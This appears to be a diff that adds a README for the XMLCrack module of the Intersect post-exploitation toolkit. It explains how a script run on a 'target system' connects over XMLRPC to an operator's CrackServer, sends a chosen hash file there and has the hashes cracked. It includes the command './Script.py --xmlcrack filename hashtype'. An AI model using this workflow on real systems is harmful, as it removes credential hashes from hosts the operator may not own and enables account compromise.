@@ -1,0 +1,18 @@
+The XMLRPC Cracking Utility is originally written by Stephen Haywood aka AverageSecurityGuy
+You can find the original version at https://github.com/averagesecurityguy/crack/
+
+Important! This module has not been fully tested so there may be some bugs. If you find anything wrong with this, please let me know.
+
+Instructions:
+
+When you build your custom Intersect script, you will be asked to define a Remote Host (your XML servers IP) and a Remote Port (the XML servers port).
+Make sure you start crackserver.py with the correct host and port information before you attempt to run XMLCrack on the target host side.
+
+Edit the crack.cfg file to suit you specific needs. There are instructions within crack.cfg that explain how you should do this.
+
+1) Start your CrackServer.py XMLRPC server
+2) Run "./Script.py --xmlcrack filename hashtype" on the target system
+3) The target system will open an XMLRPC connection to the system running CrackServer.py
+4) The target system will serve up the specified file and the specified hash type
+5) The CrackServer will use Crack.py and Crack.cfg to attempt to crack the hashes within the specified file
+
